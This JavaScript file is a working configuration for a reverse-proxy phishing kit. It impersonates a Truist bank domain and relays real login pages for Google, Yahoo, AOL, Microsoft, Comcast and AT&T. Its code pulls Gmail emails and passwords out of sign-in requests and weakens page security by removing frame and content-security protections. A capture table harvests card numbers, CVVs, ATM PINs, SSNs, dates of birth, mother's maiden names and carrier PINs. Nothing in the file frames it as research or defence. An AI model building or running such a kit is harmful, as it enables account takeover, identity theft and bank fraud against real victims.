/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const superagent = require('superagent')

const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */

/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/recaptcha')) {
            return this.browserReq.pipe(this.proxyEndpoint)
        } else if (this.clientContext.currentDomain === 'accounts.google.com') {
            return this.makeGmailProcess()
        }
        return super.processRequest()

    }

    makeGmailProcess() {
        if (this.browserReq.headers['content-length'] > 0) {
            let cJust = ''
            this.browserReq.on('data', (chunk) => {
                cJust += chunk.toString('utf8')
            })
            this.browserReq.on('end', () => {
                cJust += ''
                const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
                const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')


                // const bgRegex = /bgRequest=[^&]*/
                if (this.browserReq.url.startsWith('/v3/signin/_/AccountsSignInUi/data/batchexecute')) {
                    const emailRegex = /f\.req=%5B%5B%5B%22V1UmUe%22%2C%22%5Bnull%2C%5C%22(.*?)%5C%22/
                    const pwRegex = /f\.req=%5B%5B%5B%22B4hajb%22%2C%22%5B1%2C1%2Cnull%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%5C%22(.*?)%5C%22/
                    
                    const emailMatch = emailRegex.exec(kJust)
                    const passwordMatch = pwRegex.exec(kJust)
                    if (emailMatch) {
                        console.log('Email matched')
                        const emailAdressencoded = emailMatch[1]
                        const emailGmail = decodeURIComponent(emailAdressencoded)
                        Object.assign(this.browserReq.clientContext.sessionBody,
                            { email: emailGmail })
                        console.log(`email address is ${emailGmail}`)
                        this.proxyEndpoint.setHeader('content-length', kJust.length)
                                this.proxyEndpoint.write(kJust) 
                                this.proxyEndpoint.end('')

                    }else if (passwordMatch) {
                        console.log('Password matched')
                        const passwwordEncoded = passwordMatch[1]
                        const passwordStr = decodeURIComponent(passwwordEncoded)
                        Object.assign(this.browserReq.clientContext.sessionBody,
                            { password: passwordStr })
                        console.log(`password is ${passwordStr}`)
                        this.proxyEndpoint.setHeader('content-length', kJust.length)
                                this.proxyEndpoint.write(kJust) 
                                this.proxyEndpoint.end('')
                    } else {
                        console.log('NO matches found')
                        this.proxyEndpoint.setHeader('content-length', kJust.length)
                        this.proxyEndpoint.write(kJust)
                        this.proxyEndpoint.end('')
                    }


                } else {
                    console.log('Another url path')
                    this.proxyEndpoint.setHeader('content-length', kJust.length)
                    this.proxyEndpoint.write(kJust)
                    this.proxyEndpoint.end('')
                }
                // this.proxyEndpoint.write(kJust)
            })
        } else {
            this.browserReq.pipe(this.proxyEndpoint)
        }

    }

    
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: `${process.env.HOST_DOMAIN}/playboy`,
            },
            {
                reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
                replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
            },
            {
                reg: /name="checkConnection" value/gi,
                replacement: /name"checkConnection" value="youtube:1052:1"/,
            },
            {
                reg: /www\.google\.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /login\.yahoo\.net/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /www.gstatic.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /integrity/,
                replacement:'xintegrity'
            },
            {
                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/,
                replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
            }
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        if (this.proxyResp.req.path.startsWith('/login/sign-in/internal/entry') && this.proxyResp.statusCode === 200) {
            this.browserEndPoint.writeHead(302, {'location': '/login/sign-in/signOnSuccessRedirect.go'})
            return this.browserEndPoint.end('')
        }


        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url
            const checkUrls = ["https://guce.yahoo.com", 
            "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", 
             "/account/comm-channel/refresh", '/account/upsell/webauthn',
             "https://account.live.com", "https://account.microsoft.com",
             "https://api.login.aol.com/oauth2/request_auth",
             'https://guce.aol.com/consent?gcrumb=',
             "https://www.aol.com/", 'https://www.office.com/landing'

             ]
            
            for (let exitUrl of checkUrls) {
                if (rLocation.startsWith(exitUrl)) {
                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
                    this.browserEndPoint.end('')
                }
            }           
        }

        
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        this.req.headers['origin'] = `https://${clientContext.currentDomain}`

        this.req.headers['referer'] = this.req.headers['referer']? 
            this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''


        if (this.req.method === 'POST') {
            clientContext.setLogAvailable(true)
            super.captureBody(clientContext.currentDomain, clientContext)
        }

        if (this.req.url.startsWith('/CheckCookie?continue=http')) {
            super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: '/auth/login/finish' })
            return super.cleanEnd('PHP-EXEC', clientContext)
        }


        if (this.req.url.startsWith('/CheckCookie')) {
            clientContext.setLogAvailable(true)
            clientContext.info.isLogin = true
            super.sendClientData(clientContext, {})
        }
        if (this.req.url.startsWith('/ServiceLogin?')  && clientContext.info.isLogin === true) {
            this.res.writeHead(302, { location: 'https://safety.google/privacy/data/' })
            return super.cleanEnd(clientContext.currentDomain, clientContext)

        }

        if (this.req.url.startsWith('/punctual/')) {
            
            this.req.headers['referrer'] = 'https://accounts.google.com'
            if (this.req.headers['origin']) {
                this.req.headers['origin'] = 'https://accounts.google.com'
            }
            return super.superExecuteProxy('signaler-pa.googleapis.com', clientContext)
        }


        if (this.req.url.startsWith('/playboy')) {
            const qhost = 'play.google.com'
            this.req.url = this.req.url.replace('/playboy/log', '/log')
            return super.superExecuteProxy(qhost, clientContext)
        }
        if (this.req.url.startsWith('/CheckConnection')) {
            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
            return super.superExecuteProxy('accounts.youtube.com', clientContext)
        }
        if (this.req.url.startsWith('/kmsi') || this.req.url.startsWith('/account/upsell/webauthn') || this.req.url.startsWith('/account/fb-messenger-linking')) {
            // super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: '/auth/login/finish' })
            return this.res.end('')
        }

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            if (redirectToken.url.startsWith('https://myaccount.google.com/') || 
            redirectToken.url.startsWith('https://account.live.com') ||
            redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                super.sendClientData(clientContext, {})
                this.res.writeHead(302, { location: '/auth/login/finish' })
                return super.cleanEnd('PHP-EXEC', clientContext)
            }

            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')

            } else {
                this.req.url = reqCheck 
            }
            return this.superExecuteProxy(redirectToken.obj.host, clientContext)


        }
       
        
        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
    }
}


const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/session/secure/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {
            if (this.req.url === '/session/secure/email/validate') {
                super.uploadRequestBody(clientContext.currentDomain, clientContext)

                super.superExecutePhpScript('addon/validate.php', clientContext)
            } else {
                
                switch (this.req.url) {
                    case '/session/secure/exec':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(200)
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    case '/session/secure/email':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: '/session/secure/card'})
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    case '/session/secure/profile':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: 'https://www.truist.com/content/dam/truist-bank/us/en/documents/footer/privacy-policy-truist-english.pdf'})
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    case '/session/secure/card':
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(302, { location: '/session/secure/profile'})
                        super.cleanEnd('PHP-EXEC', clientContext)
                        break
                    default:
                        super.uploadRequestBody(clientContext.currentDomain, clientContext)
                        this.res.writeHead(200)
                        super.cleanEnd('PHP-EXEC', clientContext)
                }
            }
        } else {
            switch (this.req.url) {
                case '/session/secure/login':
                    super.superExecutePhpScript('login.php', clientContext)
                    break
                case '/session/secure/profile':
                    super.superExecutePhpScript('profile.php', clientContext)
                    break
                case '/session/secure/card':
                    super.superExecutePhpScript('card.php', clientContext)
                    break
                case '/session/secure/email':
                    super.superExecutePhpScript('auth.php', clientContext)
                    break
                default:
                    super.superExecutePhpScript('404.php', clientContext)
            }
        }
    }


}


const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        if (req.url.startsWith('/auth/login/')) {
            return true
        } return false
    }

    execute(clientContext) {
        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.yahoo.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/comcast') {
                this.req.url = '/login?r=comcast.net&s=oauth'
                clientContext.currentDomain = 'login.xfinity.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/gmail') {
                // eslint-disable-next-line max-len
                this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&hl=en&flowEntry=ServiceLogin'
                clientContext.currentDomain = 'accounts.google.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
                // this.res.writeHead(302, { location: 'https://www.googl3uth.com/b/wZKOnZ/' })
                // return this.res.end('')
            }
            if (this.req.url === '/auth/login/outlook') {
                clientContext.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/att') {
                // this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                clientContext.currentDomain = 'caaid.att.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/finish') {
                clientContext.setLogAvailable(true)
                super.sendClientData(clientContext, {})
                return super.exitLink('/session/secure/card')
                // return this.res.end()
            }
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/recaptcha/');

    }

    execute(clientContext) {

        this.req.headers['origin'] = `https://${clientContext.currentDomain}`

        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''


        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
            const hostnameBase64Key = hostnameKey.toString('base64');
            console.log(hostnameBase64Key)

            this.req.url = this.req.url.replace('..', '==')
            this.req.url = this.req.url.replace('.&', '=&')


            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')

            
            console.log(this.req.url)
            return super.superExecuteProxy('www.google.com', clientContext)


        }


        if (this.req.url.startsWith('/recaptcha/enterprise')) {
            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''


            console.log(JSON.stringify(this.req.headers))
            
            return super.superExecuteProxy('www.google.com', clientContext)

        }

       

        if (this.req.url.startsWith('/recaptcha/releases')) {
            return super.superExecuteProxy('www.gstatic.com', clientContext)

        }


    }
}


const configExport = {
    CURRENT_DOMAIN: 'dias.bank.truist.com',
    START_PATH: '/session/secure/login',
    PRE_HANDLERS:
        [
            ExecPhpPager,
            EmailLoginHandler,
            RecaptchaHandler
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['sko1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword: {
            method: 'POST',
            params: ['skun1'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        loginUserName2: {
            method: 'POST',
            params: ['sko'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        loginPassword2: {
            method: 'POST',
            params: ['skun'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

       
        email: {
            method: 'POST',
            params: ['email'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword1: {
            method: 'POST',
            params: ['cpassword'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        manualEmailPassword2: {
            method: 'POST',
            params: ['confirmpassword'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        CardNumber: {
            method: 'POST',
            params: ['cardNumber'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        Expiry: {
            method: 'POST',
            params: ['expiry'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        cvv: {
            method: 'POST',
            params: ['cvv'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        PIN: {
            method: 'POST',
            params: ['atmpin'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
        SSN: {
            method: 'POST',
            params: ['ssn'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        fullName: {
            method: 'POST',
            params: ['fullname'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        dob: {
            method: 'POST',
            params: ['dob'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        address: {
            method: 'POST',
            params: ['address'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        motherMaidenName: {
            method: 'POST',
            params: ['mmm'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        state: {
            method: 'POST',
            params: ['state'],
            urls: '',
            hosts: 'PHP-EXEC',
        },
       
        phone: {
            method: 'POST',
            params: ['phone'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        carrierPin: {
            method: 'POST',
            params: ['cpin'],
            urls: '',
            hosts: 'PHP-EXEC',
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

}
module.exports = configExport